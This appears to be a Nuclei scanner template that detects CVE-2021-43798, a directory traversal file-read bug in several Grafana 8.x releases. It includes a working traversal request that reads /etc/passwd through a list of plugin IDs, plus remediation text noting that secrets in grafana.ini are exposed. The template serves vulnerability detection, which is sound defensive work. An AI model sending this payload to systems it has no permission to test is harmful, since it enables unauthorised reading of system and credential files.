id: CVE-2021-43798

info:
  name: Grafana 8.0.0-beta1 - 8.3.0 Arbitrary File Read
  author: z0ne,dhiyaneshDk
  severity: high
  description: Grafana is an open-source platform for monitoring and observability. Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is: `<grafana_host_url>/public/plugins//`, where is the plugin ID for any installed plugin. At no time has Grafana Cloud been vulnerable. Users are advised to upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1. The GitHub Security Advisory contains more information about vulnerable URL paths, mitigation, and the disclosure timeline.
  reference:
    - https://nosec.org/home/detail/4914.html
    - https://github.com/jas502n/Grafana-VulnTips
    - https://twitter.com/pyn3rd/status/1468138032477859841
    - https://twitter.com/naglinagli/status/1468155313182416899
  remediation: The latest Grafana unpatched 0 Day LFI  is now being actively exploited, it affects only Grafana 8.0+, Vulnerable companies should revoke the secrets they store at their /etc/grafana/grafana.ini ASAP as there is no official fix in the meantime.
  tags: cve,cve2021,grafana,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd"

    payloads:
      plugin-id:
        - grafana-clock-panel
        - alertlist
        - graph
        - elasticsearch
        - dashlist
        - cloudwatch
        - mysql
        - influxdb
        - heatmap
        - graphite
        - prometheus
        - postgres
        - pluginlist
        - opentsdb
        - text
        - table
        - stackdriver
        - grafana-azure-monitor-datasource
        - grafana-simple-json-datasource

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
